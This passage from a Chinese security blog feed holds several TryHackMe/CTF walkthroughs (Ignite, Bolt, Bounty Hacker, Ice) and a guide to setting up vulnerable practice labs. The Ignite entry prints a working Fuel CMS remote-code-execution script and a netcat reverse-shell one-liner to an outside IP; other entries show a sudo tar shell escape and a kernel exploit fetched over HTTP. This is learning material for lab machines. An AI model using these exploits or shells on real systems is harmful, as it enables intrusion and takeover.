alt="image.png"></p><p>但是这台机子没有gcc环境，如果要用要我们自己去下载，但是测试发现它有cc服务，那我们用cc也可以<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021330331.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021331723.png" alt="image.png"></p><p><code>cp /usr/share/exploitdb/exploits/linux/local/37292.c ./</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021334778.png" alt="image.png"><br>改这里<br>本机开个服务器<br>python -m http.server 80<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021337505.png" alt="image.png"></p><p>目标机器下载<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021337466.png" alt="image.png"><br>照着教程<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021342408.png" alt="image.png"><br>提权成功</p><h1 id="4-寻找敏感信息"><a href="#4-寻找敏感信息" class="headerlink" title="4.寻找敏感信息"></a>4.寻找敏感信息</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021344835.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021344300.png" alt="image.png"><br>完成</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个靶机考点在高端口的服务，一般不会扫描这么大的端口，因为nmap很耗时间，但是rustscan的快速扫描避免了这个问题，然后就是对密码的爆破，打点多个账号之间相互连通，不停换号，然后对漏洞的利用，内核提权。</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB入门学习之靶场搭建</title>
    <link href="/2024/08/01/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/08/01/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="语言环境"><a href="#语言环境" class="headerlink" title="语言环境"></a>语言环境</h1><p>先安装一个phpstudy<br><a href="https://www.xp.cn/">小皮面板(phpstudy) - 让天下没有难配的服务器环境！ (xp.cn)</a><br>下载之后一直下一步就行<br>因为后面会经常用到mysql<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011104539.png" alt="image.png"><br>找到mysql的bin路径<br>复制到环境变量<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011105129.png" alt="image.png"><br>具体添加方法下面写了</p><p>然后是java环境搭建<br><a href="https://www.oracle.com/cn/java/technologies/downloads/#jdk17-windows">Java Downloads | Oracle 中国</a><br>这里我们并不需要下载最新的，jdk17就行，其他版本也可以<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011014139.png" alt="image.png"><br>然后如图示下载<br>我的靶场都是基于windows搭建的，所以就选windows<br>下载好之后同样一直下一步就行<br>然后右键<br>此电脑，点击属性<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011019347.png" alt="image.png"><br>再在打开的界面右边找到“高级系统设置”<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011020265.png" alt="image.png"><br>点击环境变量<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011021204.png" alt="image.png"><br>在系统变量中新建<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011022592.png" alt="image.png"><br>填入（下面那行填入你的jdk所在的路径）</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">JAVA_HOME<br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\JAVA\jdk-17</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011024035.png" alt="image.png"><br>再新建一个</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">CLASSPATH<br>.;<span class="hljs-meta">%</span>JAVA_HOME<span class="hljs-meta">%</span>\lib\dt.jar;<span class="hljs-meta">%</span>JAVA_HOME<span class="hljs-meta">%</span>\lib\tools.jar;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011025278.png" alt="image.png"></p><p>再双击PATH<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011027772.png" alt="image.png"><br>新建<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011027708.png" alt="image.png"><br>新建这两行</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">JAVA_HOME</span></span>%\bin<br><span class="hljs-tag">%<span class="hljs-selector-tag">JAVA_HOME</span></span>%\jre\bin<br></code></pre></td></tr></table></figure><p>然后就是一路确定就行<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011029155.png" alt="image.png"><br>这样就算是安装成功</p><h1 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h1><p>然后就是会用到的靶场</p><h2 id="多项"><a href="#多项" class="headerlink" title="多项"></a>多项</h2><h3 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h3><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">zhuifengshaonianhanlu&#x2F;pikachu: 一个好玩的Web安全-漏洞测试平台 (github.com)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011051461.png" alt="image.png"><br>下载解压到phpstudy的WWW目录下，再到inc目录下修改配置<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011122756.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011123830.png" alt="image.png"><br>可以看到我们的默认数据库账号密码都是root<br>但是他给出了一个pikachu数据库，我们也新建一个（新建前要改密码，自己改喜欢的就行）<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011128809.png" alt="image.png"><br>配置如上即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011129538.png" alt="image.png"><br>新建一个网站<br>然后在浏览器访问127.0.0.1&#x2F;pikachu即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011129631.png" alt="image.png"><br>完成</p><h3 id="WebGoat"><a href="#WebGoat" class="headerlink" title="WebGoat"></a>WebGoat</h3><p><a href="https://github.com/WebGoat/WebGoat/releases">Releases · WebGoat&#x2F;WebGoat (github.com)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011053678.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011134695.png" alt="image.png"><br>点击上面框框清空输入cmd</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-Dfile.encoding=UTF<span class="hljs-number">-8</span> -<span class="hljs-keyword">jar </span>webgoat.<span class="hljs-keyword">jar</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011141931.png" alt="image.png"><br>我们也可以写一个bat文件，避免每次都进cmd写代码</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">@echo off<br><span class="hljs-keyword">java </span>-Dfile.encoding=UTF<span class="hljs-number">-8</span> -<span class="hljs-keyword">jar </span>webgoat.<span class="hljs-keyword">jar</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">pause</span><br></code></pre></td></tr></table></figure><p>跟webgoat.jar放在同一目录即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011204764.png" alt="image.png"><br>注册个账号（register）<br>就可以开打了</p><h3 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h3><p><a href="https://github.com/WebGoat/WebGoat/releases">Releases · WebGoat&#x2F;WebGoat (github.com)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011056423.png" alt="image.png"><br>直接点下面那个download或者点上面的简体中文看看介绍，也有下载功能<br>跟前面差不多</p><h2 id="专项"><a href="#专项" class="headerlink" title="专项"></a>专项</h2><h3 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h3><p><a href="https://github.com/c0ny1/upload-labs/releases/tag/0.1">Release upload-labs 0.1 · c0ny1&#x2F;upload-labs (github.com)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011101808.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011341266.png" alt="image.png"></p><h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011058018.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011336569.png" alt="image.png"><br>修改db-creds.inc<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011337410.png" alt="image.png"><br>跟pikachu一样改改就能用<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408011338793.png" alt="image.png"><br>如果报错，说什么连接那里有问题什么什么第29行的，就改一下php版本，在phpstudy里下载一个老版本，php5.x应该都行</p><h3 id="XXE-lab"><a href="#XXE-lab" class="headerlink" title="XXE-lab"></a>XXE-lab</h3><p><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a><br>一样</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p><a href="https://github.com/haozi/xss-demo">https://github.com/haozi/xss-demo</a><br><a href="https://xss-game.appspot.com/%EF%BC%88%E5%9B%BD%E5%A4%96%EF%BC%89">https://xss-game.appspot.com/（国外）</a><br><a href="https://brutelogic.com.br/knoxss.html">https://brutelogic.com.br/knoxss.html</a><br><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p><h2 id="Docker一键安装"><a href="#Docker一键安装" class="headerlink" title="Docker一键安装"></a>Docker一键安装</h2><p>网上搜<br><a href="https://github.com/c0ny1/vulstudy">c0ny1&#x2F;vulstudy: 使用docker快速搭建各大漏洞靶场，目前可以一键搭建17个靶场。 (github.com)</a></p><h2 id="WAF搭建"><a href="#WAF搭建" class="headerlink" title="WAF搭建"></a>WAF搭建</h2><h3 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h3><p><a href="https://www.safedog.cn/server_safedog.html">服务器安全狗-服务器安全软件,防DDOS|防CC攻击|ARP防火墙|服务器杀毒|漏洞修复 (safedog.cn)</a><br>一直下一步就行</p><p>在线waf练习<br><a href="https://stack.chaitin.com/security-challenge/safeline/index">WAF 绕过挑战 - CT Stack 安全社区 (chaitin.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY7-Bolt</title>
    <link href="/2024/06/26/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY7-Bolt/"/>
    <url>/2024/06/26/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY7-Bolt/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY7-Bolt"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY7-Bolt" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY7-Bolt"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY7-Bolt</h1><p><a href="https://tryhackme.com/r/room/bolt">TryHackMe的 |客房信息 — TryHackMe | Room details</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111874.png" alt="image-20240401140426104"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111890.png" alt="image-20240401141051610"></p><p>先是扫描出三个端口，再进行详细扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111894.png" alt="image-20240401141334079"></p><p>22一般就是SSH</p><p>我们看看80</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111903.png" alt="image-20240401141234597"></p><p>再看8000</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111912.png" alt="image-20240401141413885"></p><p>很明显8000端口就是个CMS</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111920.png" alt="image-20240401141537549"></p><p>然后这个就是网站管理员名字</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261121792.png" alt="image-20240401141635748"></p><p>圈起来的是用户名</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261121991.png" alt="image-20240401141805357"></p><p>圈起来的是密码</p><p>然后我一开始想直接有个login或者admin的后缀就能进行登录，但都没成功，然后又进行目录扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261121852.png" alt="image-20240401142842547"></p><p>也没找到有用的</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111448.png" alt="image-20240401142951868"></p><p>百度搜索到管理界面</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261121465.png" alt="image-20240401143022133"></p><p>成功进入登陆界面</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261122888.png" alt="image-20240401143124670"></p><p>在左下角找到版本号</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111690.png" alt="image-20240401143214397"></p><p>然后只找到一个3.7.0的漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111687.png" alt="image-20240401144734808"></p><p>用msfconsole看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111691.png" alt="image-20240401144914435"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111694.png" alt="image-20240401145130159"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111701.png" alt="image-20240401145239473"></p><p>成功进入</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111864.png" alt="image-20240401145418726"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY6-ignite</title>
    <link href="/2024/06/20/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY6-ignite/"/>
    <url>/2024/06/20/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY6-ignite/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY6-ignite"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY6-ignite" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY6-ignite"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY6-ignite</h1><p><a href="https://tryhackme.com/r/room/ignite">尝试黑客 |点燃 — TryHackMe | Ignite</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916919.png" alt="image-20240330115635903"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916929.png" alt="image-20240330121809629"></p><p>只有80端口开启了服务</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916928.png" alt="image-20240330122016345"></p><p>对它进行目录扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916932.png" alt="image-20240330121942818"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916938.png" alt="image-20240330120154101"></p><p>打开网站，发现一个Fuel CMS</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916936.png" alt="image-20240330122319877"></p><p>访问robots.txt中的页面来到这里</p><p>弱口令admin，admin直接进去了</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916591.png" alt="image-20240330123045149"></p><p>然后我们查查看这个CMS有没有爆出来的漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916710.png" alt="image-20240330123346313"></p><p>找到三个1.4.1的漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916090.png" alt="image-20240330123640015"></p><p>这里我们先试试第一个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916252.png" alt="image-20240330123848266"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><br>url = <span class="hljs-string">&quot;http://&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_nth_overlapping</span>(<span class="hljs-params">haystack, needle, n</span>):<br>    start = haystack.find(needle)<br>    <span class="hljs-keyword">while</span> start &gt;= <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> n &gt; <span class="hljs-number">1</span>:<br>        start = haystack.find(needle, start+<span class="hljs-number">1</span>)<br>        n -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> start<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>xxxx = raw_input(<span class="hljs-string">&#x27;cmd:&#x27;</span>)<br>burp0_url = url+<span class="hljs-string">&quot;/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27&quot;</span>+urllib.quote(xxxx)+<span class="hljs-string">&quot;%27%29%2b%27&quot;</span><br>r = requests.get(burp0_url)<br><br>html = <span class="hljs-string">&quot;&lt;!DOCTYPE html&gt;&quot;</span><br>htmlcharset = r.text.find(html)<br><br>begin = r.text[<span class="hljs-number">0</span>:<span class="hljs-number">20</span>]<br>dup = find_nth_overlapping(r.text,begin,<span class="hljs-number">2</span>)<br><br><span class="hljs-built_in">print</span>(r.text[<span class="hljs-number">0</span>:dup])<br></code></pre></td></tr></table></figure><p>他原本的代码会有一点问题，以上是修改好的（第四行url自己填，还有就是要用python2运行，不然会报错）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916210.png" alt="image-20240330223859975"></p><p>成功进入，就是有点奇怪</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916692.png" alt="image-20240330224016522"></p><p>输入这个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fuel/application/config/database.php<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916578.png" alt="image-20240330224110421"></p><p>我们得到这个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916087.png" alt="image-20240330224844175"></p><p>艰难找了半天得到flag</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916205.png" alt="image-20240330234831233"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /tmp/f ; <span class="hljs-built_in">mkfifo</span> /tmp/f ; <span class="hljs-built_in">cat</span> /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.2.127.38 7777 &gt;/tmp/f<br></code></pre></td></tr></table></figure><p>这个一定最好用最快捷，改个ip地址跟端口就行</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916837.png" alt="image-20240330234841467"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>再输入这个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916242.png" alt="image-20240330235257991"></p><p>就有了用户标识</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916619.png" alt="image-20240330235357041"></p><p>用我们刚才找到的密码直接提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916803.png" alt="image-20240330235505735"></p><p>拿到root.txt</p><p><a href="https://unicornsec.com/home/tryhackme-ignite">tryhackme - 点燃 — 独角兽sec — tryhackme - ignite — unicornsec</a></p><p>参考这个wp</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY5-Bounty Hacker</title>
    <link href="/2024/06/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY5-Bounty-Hacker/"/>
    <url>/2024/06/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY5-Bounty-Hacker/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY5-Bounty-Hacker"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY5-Bounty-Hacker" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY5-Bounty Hacker"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY5-Bounty Hacker</h1><p><a href="https://tryhackme.com/r/room/cowboyhacker">尝试黑客 |赏金黑客 — TryHackMe | Bounty Hacker</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155462.png" alt="image-20240328143901896"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155504.png" alt="image-20240328172207156"></p><p>一开始扫描扫到了21，22，80三个端口（耗时太长，先不等了），分别对应FTP,SSH,HTTP这三种服务</p><p>这里我们尝试采用匿名访问漏洞去进行检测，成功发现以下文件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155499.png" alt="image-20240328172136513"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155514.png" alt="image-20240328173140260"></p><p>把他们获取下来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155501.png" alt="image-20240328173220542"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155508.png" alt="image-20240328173309373"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155929.png" alt="image-20240328173339245"></p><p>这里我们看到这台主机可能的用户名lin，还有疑似的密码，于是下一步自然而然想到hydra爆破连接ssh</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155965.png" alt="image-20240328173850094"></p><p>成功拿到pwd</p><p>RedDr4gonSynd1cat3</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155005.png" alt="image-20240328173954499"></p><p>成功连上目标主机</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155069.png" alt="image-20240328174115772"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155105.png" alt="image-20240328174538368"></p><p>这里出现了提权失败的问题</p><p><a href="https://gtfobins.github.io/gtfobins/tar/#sudo">采取 |go away垃圾箱 — tar | GTFOBins</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo tar -cf /dev/<span class="hljs-literal">null</span> /dev/<span class="hljs-literal">null</span> <span class="hljs-attribute">--checkpoint</span>=1 <span class="hljs-attribute">--checkpoint-action</span>=exec=/bin/sh<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155140.png" alt="image-20240328182652738"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155246.png" alt="image-20240328173515257"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155341.png" alt="image-20240328182801554"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY4-ICE</title>
    <link href="/2024/06/18/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY4-ICE/"/>
    <url>/2024/06/18/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY4-ICE/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY5-ICE"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY5-ICE" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY5-ICE"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY5-ICE</h1><p><a href="https://tryhackme.com/r/room/ice">TryHackMe的 |冰 — TryHackMe | Ice</a></p><p><a href="https://icecast.org/">Icecast</a></p><h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>连接openvpn</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181809673.png" alt="image-20240320232436077"></p><p>第一个问题，SYN扫描就是</p><p>-sS</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810766.png" alt="image-20240320232804490"></p><p>第二个问题，远程连接的端口是3389</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810205.png" alt="image"></p><p>（这里我的nmap扫描太慢了，拿别人成果顶一下先）</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><h3 id="题解-2"><a 